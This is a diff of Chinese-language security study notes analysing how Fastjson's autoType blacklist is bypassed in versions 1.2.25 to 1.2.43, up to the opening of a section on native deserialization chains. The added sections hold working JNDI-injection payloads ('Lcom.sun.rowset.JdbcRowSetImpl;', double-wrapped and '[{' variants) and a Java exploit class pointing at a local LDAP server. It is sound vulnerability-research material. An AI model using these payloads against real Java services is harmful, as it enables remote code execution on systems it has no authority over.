@@ -1222,9 +1222,13 @@ public class FastjsonBypass_1247 {
 
 缓存里面有，直接拿了，没有走到黑白名单检测那里，直接返回。后续就正常反序列化执行恶意代码了，不再看了。这种绕过手法在fastjson的1.2.25到1.2.47版本下都是能用的。
 
-**简单说说开启AutoTypeSupport的利用**
+![image-20231205164413925](image/image-20231205164413925.png)
 
-上面总结的在缓存里放恶意类的利用手法前提是不开启这个开关，当然默认也是不开启的。那么如果开启了，回看上面的代码，其实更简单了
+### FastJson1.2.25-1.2.41绕过
+
+##### 分析：
+
+上面总结的在缓存里放恶意类的利用手法前提是不开启这个开关，当然默认也是不开启的。那么如果开启了，（typeutils.loadclass) 回看上面的代码，其实更简单了
 
 ![22.png](image/1689825463_64b8b0b7e8148e65c4e1a.jpeg)
 
@@ -1232,13 +1236,158 @@ public class FastjsonBypass_1247 {
 
 ![23.png](image/1689825466_64b8b0ba84709fcea61de.jpeg)
 
-重点是这段代码，检测反序列化的类开头是否是L，结尾是否是分号。如果是，就去掉，再进行loadClass，一个递归操作。如果修改恶意类是这样子
+重点是这段代码，检测反序列化的类开头是否是L，结尾是否是分号。如果是，就去掉，再进行loadClass，一个递归操作。
+
+- ```
+  其中的检测如下：
+  
+  - 如果以`[`开头则去掉`[`后进行类加载（在之前Fastjson已经判断过是否为数组了，实际走不到这一步）
+  - 如果以`L`开头，以`;`结尾，则去掉开头和结尾进行类加载
+  ```
+
+如果修改恶意类是这样子
 
 ```
 Lcom.sun.rowset.JdbcRowSetImpl;
 ```
 
+开启AutoType：
+
+```
+import com.alibaba.fastjson.parser.ParserConfig;
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+```
+
 就可以绕过黑名单，另外在检测到L和分号的时候去空，就可以正常的反序列化了。
 
 <img src="image/1689825470_64b8b0becabc1fe9e6d3b.jpeg" alt="24.png" style="zoom:150%;" />
+
+##### exp：
+
+开启AutoType：
+
+```
+import com.alibaba.fastjson.parser.ParserConfig;
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+```
+
+payloa：
+
+```
+{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","DataSourceName":"ldap://127.0.0.1:8085/rNMfFuPI","AutoCommit":"false"}
+```
+
+exp：
+
+```java
+package EXPFastJson;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+public class FastJsonBypass1247 {
+    public static void main(String[] args){
+        //第一步：反序列化一个Class类，值为恶意类
+        //用之前payload从缓存中继续加载
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+
+//        String s="{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/hFtNevZa\",\"AutoCommit\":false}}";
+
+        String s="{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName\":\"ldap://127.0.0.1:8085/hFtNevZa\",\"AutoCommit\":1}";
+        JSON.parseObject(s);
+    }
+}
+```
+
+### FastJson1.2.42绕过
+
+1.2.42相较于之前的版本，关键是在`ParserConfig.java`中修改了1.2.41前的代码
+
+- 对于传入的类名，删除开头`L`和结尾的`;`
+
+但是可以发现在以上的处理中，只删除了一次开头的`L`和结尾的`;`，双写可以绕过。
+
+```java
+{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"DataSourceName\":\"ldap://127.0.0.1:8085/ZGBWoLkn\",\"AutoCommit\":1}";
+```
+
+### FastJson1.4.43绕过：
+
+1.2.43版本修改了`checkAutoType()`的部分代码，对于LL等开头结尾的字符串抛出异常，这里我们就可以用`[`和`{`进行绕过：
+
+```java
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"DataSourceName":"ldap://127.0.0.1:8085/hFtNevZa","AutoCommit":1}
+```
+
+##### 分析：
+
+1.2.43版本对1.2.42版本的绕过进行了修复，根据checkAutoType函数抛出的异常信息，我们来分析一下1.2.43版本对checkAutoType函数进行了哪些修复措施。
+
+![image-20231205170612190](image/image-20231205170612190.png)
+
+checkAutoType函数首先判断了className中的类是否以字符“L”开头，以字符“;”结尾，如果满足条件，继续判断是否以字符“LL”开头，如果满足条件则抛出异常，也就是说1.2.42版本的payload会被过滤掉。
+
+![image-20231205170655982](image/image-20231205170655982.png)
+
+由于1.2.42版本的payload已无法利用，因此我们需要另寻突破口，而TypeUtils类的loadClass方法就是我们要寻找的突破口。在**1.2.42版本中loadClass方法会对className进行校验**
+
+![image-20231205171428019](image/image-20231205171428019.png)
+
+loadClass方法首先会对className进行判断是否以“[”字符开头，如果满足条件就调用继续调用loadClass方法，传入两个参数，一个是className指定的类全路径（className会调用substring方法把开头的“[”字符去掉），另一个是类加载器classLoader。
+
+那么可以对payload进行改造，在TemplatesImpl类前面加一个“[”字符，这样就可以绕过checkAutoType函数的过滤，如下所示：
+
+```
+[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+```
+
+再次运行程序还是会报错，根据抛出的异常来看，是在调用DefaultJSONParser类的parseArray方法时抛出的异常
+
+![image-20231205171640679](image/image-20231205171640679.png)
+
+ 但是DefaultJSONParser类的parseArray方法是在checkAutoType函数之后调用的，可以肯定的是checkAutoType函数被绕过了，那么到底是哪里出错了？
+
+我们来分析一下DefaultJSONParser类的parseArray方法，发现是parseArray方法的if语句会判断token的值，如果token的值不是14就抛出的异常，这里可以看到解析出来的token值为16，那么token的值从何而来？
+
+![image-20231205171656456](image/image-20231205171656456.png)
+
+通过对token进行回溯分析，发现调用完checkAutoType函数之后，接着会调用nextToken方法设置token
+
+![image-20231205171709239](image/image-20231205171709239.png)
+
+nextToken方法在case 16会判断ch的值，然后根据ch的值设置token，在调试分析中**ch的值是json数据中第一个逗号出现的位置（固定从这个位置取值）**，我们需要把token的值设置为14来绕过DefaultJSONParser类的parseArray方法。
+
+![image-20231205171721579](image/image-20231205171721579.png)
+
+既然ch取值的位置是固定的，并且还不能为以上的字符，根据之前的异常信息来看，71索引的位置正好是json中第一个逗号出现的位置，那么我们可以在逗号前的位置加一个“[”符号，如下所示
+
+![image-20231205171736861](image/image-20231205171736861.png)
+
+再次运行程序，这次会调用无参的nextToken方法把token的值设置为14，绕过DefaultJSONParser类的parseArray方法
+
+![image-20231205171749171](image/image-20231205171749171.png)
+
+ 虽然绕过了DefaultJSONParser类的parseArray方法，但是依然会抛出异常报错，从抛出的异常信息来看，提示在72索引位置缺少一个“{”字符，不同于之前的异常，这次是JavaBeanDeserializer类的deserialze方法抛出的异常
+
+![image-20231205171800057](image/image-20231205171800057.png)
+
+再次尝试再72索引位置加一个“{”字符，发现可以利用成功。
+
+![image-20231205171811821](image/image-20231205171811821.png)
+
+### FastJson原生反序列化
+
+依靠其他依赖的利用链，总归会受到环境的影响，因此我们可以尝试找出fastjson的原生反序列化链
+
+#### FastJson<=1.2.48
+
+在FastJson包里面找到继承Serializable接口的类，最后锁定的是这两个类：`JSONObject`和`JSONArray`类
+
+**JSONArray类利用链**
+
+首先我们要找到入口点，就是readObject方法，但是我们却发现`JSONArray`中并不存在`readObject`方法，并且他`extends`对应的`JSON`类也没有readObect方法，所以这里我们只有通过其他类的readObject方法来触发JSONArray或者JSON的某个方法来实现调用链。
+
+这里我们就要引入toString方法，我们可以发现在Json类中存在toString方法能够触发toJSONString方法的调用。然后我们再来探索一下
+
+如果可以触发getter方法，就能够进行进一步的调用链
 
